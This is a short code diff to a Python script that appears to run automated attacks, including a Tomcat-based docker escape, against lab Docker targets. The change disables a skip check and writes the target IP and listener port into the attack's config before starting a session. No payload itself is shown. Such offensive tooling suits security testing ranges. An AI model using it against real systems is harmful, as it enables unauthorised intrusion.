@@ -91,10 +91,10 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
 
             print(f"{C.COL_GREEN}[+] attacking ({target_ip}) with {attack_name}{C.COL_RESET}")
             
-            if(attack_name=="tomcat_server" and C.TARGETS_DOCKERS[target_ip][0]["docker_name"]!="tomcat_server"):
+            """if(attack_name=="tomcat_server" and C.TARGETS_DOCKERS[target_ip][0]["docker_name"]!="tomcat_server"):
                 print(f"{C.COL_YELLOW}[*] Special attack tomcat_server cannot be done on this machine, skipping... {C.COL_RESET}")
                 continue
-            
+            """
             if(attack_name=="smtp_server" and C.TARGETS_DOCKERS[target_ip][0]["docker_name"]!="smtp_server"):
                 print(f"{C.COL_RED}[-] Special attack smtp_server cannot be done on this machine, skipping... {C.COL_RESET}")
                 continue
@@ -110,14 +110,16 @@ def main_procedure (attacker_ip, config_file, stealth=False, stealth_sleep=0):
 
             if(attack_name=="tomcat_server"):
                 config_tomcat_file = "../stack/data/attacker/custom_attacks/docker_escape/config_rc.json"
-                with open(config_tomcat_file) as c:
-                    content = json.load(c)
+                with open(config_tomcat_file, 'r') as x:
+                    content = json.load(x)
                     print(content)
                     content["TOMCATHOST_201914271"]=target_ip
                     content["LPORT"]=LPORT
                     print(content)
+                with open(config_tomcat_file,'w') as x:
+                    json.dump(content, x, indent=4)
+                    
 
-            
             session=mc.attempt_attack(attack_obj)
             #print(attack_obj.output)
             print(session)
